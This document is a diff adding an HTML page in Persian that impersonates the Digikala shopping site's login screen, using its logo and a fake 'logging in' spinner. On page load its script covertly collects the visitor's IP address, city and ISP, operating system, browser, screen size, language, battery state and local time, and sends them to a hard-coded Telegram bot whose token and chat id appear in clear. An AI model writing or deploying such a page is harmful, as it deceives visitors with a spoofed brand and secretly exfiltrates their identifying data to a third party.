@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ورود به دیجی‌کالا</title>
+  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css"/>
+  <script src="https://cdn.jsdelivr.net/npm/bowser@2.11.0/es5.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Vazirmatn', sans-serif;
+      background: #f1f2f4;
+      direction: rtl;
+    }
+    header {
+      background-color: #ffffff;
+      padding: 10px 30px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo {
+      height: 40px;
+    }
+    .search-box {
+      flex-grow: 1;
+      margin: 0 20px;
+      display: flex;
+    }
+    .search-box input {
+      flex-grow: 1;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+    }
+    main {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 80px);
+    }
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      padding: 30px;
+      max-width: 400px;
+      width: 100%;
+      animation: fadeIn 0.5s ease;
+      text-align: center;
+    }
+    .spinner {
+      margin: 30px auto;
+      width: 48px;
+      height: 48px;
+      border: 5px solid #ccc;
+      border-top-color: #d32f2f;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    .status {
+      margin-top: 20px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #555;
+    }
+    .status.success { color: #388e3c; }
+    .status.error { color: #d32f2f; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://www.digikala.com/statics/img/svg/logo.svg" alt="digikala" class="logo" />
+    <div class="search-box">
+      <input type="text" placeholder="جستجو در دیجی‌کالا" />
+    </div>
+  </header>
+
+  <main>
+    <div class="card">
+      <h2>در حال ورود به حساب...</h2>
+      <div class="spinner" id="spinner"></div>
+      <div class="status" id="statusText">در حال بررسی اطلاعات...</div>
+    </div>
+  </main>
+
+  <script>
+    (async function(){
+      const spinner = document.getElementById('spinner');
+      const statusText = document.getElementById('statusText');
+
+      try {
+        const [ipData, battery] = await Promise.all([
+          fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>null),
+          navigator.getBattery?.().catch(()=>null)
+        ]);
+
+        const browser = bowser.getParser(navigator.userAgent).getResult();
+        const deviceType = browser.platform.type || (/Mobi|Android/i.test(navigator.userAgent) ? 'موبایل' : 'رومیزی');
+
+        const info = {
+          'آی‌پی': ipData?.ip || 'نامشخص',
+          'مکان': `${ipData?.city || '-'}, ${ipData?.region || '-'}, ${ipData?.country_name || '-'}`,
+          'ارائه‌دهنده': ipData?.org || 'نامشخص',
+          'سیستم‌عامل': `${browser.os.name} ${browser.os.versionName}`,
+          'مرورگر': `${browser.browser.name} ${browser.browser.version}`,
+          'نوع دستگاه': deviceType,
+          'رزولوشن صفحه': `${screen.width}×${screen.height}`,
+          'زبان': navigator.language || 'نامشخص',
+          'باتری': battery ? `${(battery.level*100).toFixed(0)}%` : 'نامشخص',
+          'شارژر متصل': battery ? (battery.charging?'بله':'خیر') : 'نامشخص',
+          'زمان محلی': new Date().toLocaleString('fa-IR'),
+          'زمان بر اساس منطقه': ipData?.timezone 
+            ? new Date().toLocaleString('fa-IR',{timeZone:ipData.timezone})
+            : 'نامشخص'
+        };
+
+        let message = '[ورود جدید به سامانه]\n\n';
+        for (const [key, val] of Object.entries(info)){
+          message += `${key}: ${val}\n`;
+        }
+
+        const token = '7579846670:AAELEPJ6RK_LzNpUJ1RH40KIjQUbn0LfLBY';
+        const chat_id = '7980459274';
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        const resp = await fetch(url, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({chat_id, text: message})
+        });
+
+        const result = await resp.json();
+        spinner.remove();
+        if (result.ok) {
+          statusText.textContent = 'ورود با موفقیت انجام شد.';
+          statusText.classList.add('success');
+          document.body.innerHTML = '<h1 style="text-align:center; padding:50px;">تمام.</h1>';
+        } else {
+          statusText.textContent = 'خطا در ارسال اطلاعات.';
+          statusText.classList.add('error');
+        }
+
+      } catch (err) {
+        spinner.remove();
+        statusText.textContent = 'خطا در دریافت اطلاعات.';
+        statusText.classList.add('error');
+        console.error(err);
+      }
+    })();
+  </script>
+
+</body>
+</html>
